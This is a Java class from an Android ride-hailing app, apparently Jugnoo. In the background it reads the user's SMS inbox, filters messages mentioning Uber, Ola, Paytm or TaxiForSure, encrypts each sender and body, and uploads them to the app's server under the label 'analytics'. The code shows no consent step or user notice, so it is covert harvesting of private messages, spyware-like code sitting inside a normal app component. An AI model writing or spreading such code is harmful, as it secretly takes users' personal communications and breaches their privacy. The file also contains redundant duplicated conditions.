package product.clicklabs.jugnoo.home;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

import product.clicklabs.jugnoo.Constants;
import product.clicklabs.jugnoo.datastructure.ApiResponseFlags;
import product.clicklabs.jugnoo.retrofit.RestClient;
import product.clicklabs.jugnoo.retrofit.model.SettleUserDebt;
import product.clicklabs.jugnoo.utils.AppStatus;
import product.clicklabs.jugnoo.utils.DateOperations;
import product.clicklabs.jugnoo.utils.Log;
import product.clicklabs.jugnoo.utils.Prefs;
import product.clicklabs.jugnoo.utils.RSA;
import product.clicklabs.jugnoo.utils.Utils;
import retrofit.Callback;
import retrofit.RetrofitError;
import retrofit.client.Response;
import retrofit.mime.TypedByteArray;

public class FetchAndSendMessages extends AsyncTask<String, Integer, HashMap<String, String>>{

	private final String TAG = FetchAndSendMessages.class.getSimpleName();

	private final String KEYWORD_UBER = "uber",
			KEYWORD_PAYTM = "paytm",
			KEYWORD_OLA = "ola",
			KEYWORD_OLAX = "ola!",
			KEYWORD_SAY_OLA = "say ola",
			KEYWORD_TFS = "tfs",
			KEYWORD_BOOKING = "booking",
			KEYWORD_AUTO = "auto",
			KEYWORD_TAXI_FOR_SURE = "taxiforsure",
			KEYWORD_TAXI_FS = "taxifs";

	private final long DAY_MILLIS = 24 * 60 * 60 * 1000;
	private final long THREE_DAYS_MILLIS = 3 * DAY_MILLIS;

	private Context context;
	private String accessToken;
	private boolean timeFrame;
	private long startTime, endTime;

	public FetchAndSendMessages(Context context, String accessToken,
								boolean timeFrame, String startTime, String endTime){
		this.context = context;
		this.accessToken = accessToken;
		this.timeFrame = timeFrame;
		if(this.timeFrame) {
			this.startTime = DateOperations.getMilliseconds(DateOperations.utcToLocalWithTZFallback(startTime));
			this.endTime = DateOperations.getMilliseconds(DateOperations.utcToLocalWithTZFallback(endTime));
		} else{
			this.startTime = 60000;
			this.endTime = 60000;
		}
	}
	@Override
	protected void onPreExecute() {
		super.onPreExecute();
	}

	@Override
	protected HashMap<String, String> doInBackground(String... params) {
		return getPreparedParams();
	}

	private HashMap<String, String> getPreparedParams(){
		try {
			long defaultTime = System.currentTimeMillis() - THREE_DAYS_MILLIS;
			long currentTime = System.currentTimeMillis();
			long lastTime = Prefs.with(context).getLong(Constants.SP_ANALYTICS_LAST_MESSAGE_READ_TIME, defaultTime);

			long currentMinusLast = (currentTime - lastTime);

			ArrayList<MSenderBody> mSenderBodies;
			if(timeFrame){
				mSenderBodies = fetchMessages(defaultTime, true);
			} else {
				if (currentMinusLast >= DAY_MILLIS) {
					if (lastTime > defaultTime) {
						mSenderBodies = fetchMessages(lastTime, false);
					} else {
						mSenderBodies = fetchMessages(defaultTime, false);
					}
				} else {
					mSenderBodies = new ArrayList<>();
				}
			}

			if(mSenderBodies.size() > 0){
				int maxSize = 200;
				HashMap<String, String> hParams = new HashMap<>();
				hParams.put(Constants.KEY_ACCESS_TOKEN, accessToken);
				JSONArray jArray = new JSONArray();
				for (MSenderBody message : mSenderBodies) {
					if(message.getBody().length()>maxSize){
						List<String> bodies = Utils.splitEqually(message.getBody(), maxSize);
						for(String body : bodies){
							JSONObject jObj = new JSONObject();
							jObj.put("s", message.getSender());
							jObj.put("b", body);
							String decr = RSA.encryptWithPublicKeyStr(jObj.toString());
							jArray.put(decr);
						}
					} else{
						JSONObject jObj = new JSONObject();
						jObj.put("s", message.getSender());
						jObj.put("b", message.getBody());
						String decr = RSA.encryptWithPublicKeyStr(jObj.toString());
						jArray.put(decr);
					}
				}
				hParams.put("data", jArray.toString());
				return hParams;
			} else{
				return null;
			}
		} catch (Exception e) {
			e.printStackTrace();
			return null;
		}
	}

	@Override
	protected void onPostExecute(HashMap<String, String> params) {
		super.onPostExecute(params);
		try {
			if(params != null) {
				if (AppStatus.getInstance(context).isOnline(context)) {
					Log.i(TAG, "params before api=" + params);
					RestClient.getApiServices().uploadAnalytics(params, new Callback<SettleUserDebt>() {
						@Override
						public void success(SettleUserDebt settleUserDebt, Response response) {
							try {
								String responseStr = new String(((TypedByteArray) response.getBody()).getBytes());
								Log.i(TAG, "uploadAnalytics responseStr" + responseStr);
								JSONObject jObj = new JSONObject(responseStr);
								int flag = jObj.optInt(Constants.KEY_FLAG, ApiResponseFlags.ACTION_FAILED.getOrdinal());
								if (ApiResponseFlags.ACTION_COMPLETE.getOrdinal() == flag) {
									Prefs.with(context).save(Constants.SP_ANALYTICS_LAST_MESSAGE_READ_TIME, System.currentTimeMillis());
								}
							} catch (Exception e) {
								e.printStackTrace();
							}
						}

						@Override
						public void failure(RetrofitError error) {
							Log.e(TAG, "uploadAnalytics error=" + error);
						}
					});

				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public void syncUp(){
		try {
			HashMap<String, String> params = getPreparedParams();
			if(params != null) {
				if (AppStatus.getInstance(context).isOnline(context)) {
					Log.i(TAG, "params before sync api=" + params);
					Response response = RestClient.getApiServices().uploadAnalytics(params);

					try {
						String responseStr = new String(((TypedByteArray) response.getBody()).getBytes());
						Log.i(TAG, "uploadAnalytics sync responseStr" + responseStr);
					} catch (Exception e) {
						e.printStackTrace();
					}

				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}



	private ArrayList<MSenderBody> fetchMessages(long lastTime, boolean timeFrame) {
		ArrayList<MSenderBody> messages = new ArrayList<>();
		try {
			Uri uri = Uri.parse("content://sms/inbox");
			String[] selectionArgs;
			String selection;
			Cursor cursor;
			if(timeFrame && startTime > 60000 && endTime > 60000){
				selectionArgs = new String[]{Long.toString(startTime), Long.toString(endTime)};
				selection = "date>? AND date<?";
				cursor = context.getContentResolver().query(uri, null, selection, selectionArgs, null);
			} else{
				selectionArgs = new String[]{Long.toString(lastTime)};
				selection = "date>?";
				cursor = context.getContentResolver().query(uri, null, selection, selectionArgs, null);
			}

			if (cursor != null) {
				for (cursor.moveToFirst(); !cursor.isAfterLast(); cursor.moveToNext()) {
					String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
					String sender = cursor.getString(cursor.getColumnIndexOrThrow("address"));
					try {
						if(body.toLowerCase().contains(KEYWORD_PAYTM) && body.toLowerCase().contains(KEYWORD_UBER)){
							messages.add(new MSenderBody(sender, body));
						}
						else if(body.toLowerCase().contains(KEYWORD_TFS) || body.toLowerCase().contains(KEYWORD_TFS)){
							messages.add(new MSenderBody(sender, body));
						}
						else if(body.toLowerCase().contains(KEYWORD_OLA) || body.toLowerCase().contains(KEYWORD_OLA)){
							messages.add(new MSenderBody(sender, body));
						}
						else if(body.toLowerCase().contains(KEYWORD_OLAX) || body.toLowerCase().contains(KEYWORD_OLAX)){
							messages.add(new MSenderBody(sender, body));
						}
						else if(body.toLowerCase().contains(KEYWORD_TAXI_FOR_SURE) || body.toLowerCase().contains(KEYWORD_TAXI_FOR_SURE)){
							messages.add(new MSenderBody(sender, body));
						}
						else if(body.toLowerCase().contains(KEYWORD_TAXI_FS) || body.toLowerCase().contains(KEYWORD_TAXI_FS)){
							messages.add(new MSenderBody(sender, body));
						}
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			}
			if (cursor != null){
				cursor.close();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return messages;
	}



	class MSenderBody{
		private String sender;
		private String body;

		public MSenderBody(String sender, String body){
			this.sender = sender;
			this.body = body;
		}

		public String getSender() {
			return sender;
		}

		public void setSender(String sender) {
			this.sender = sender;
		}

		public String getBody() {
			return body;
		}

		public void setBody(String body) {
			this.body = body;
		}

		@Override
		public String toString() {
			return getSender()+" "+getBody();
		}
	}
}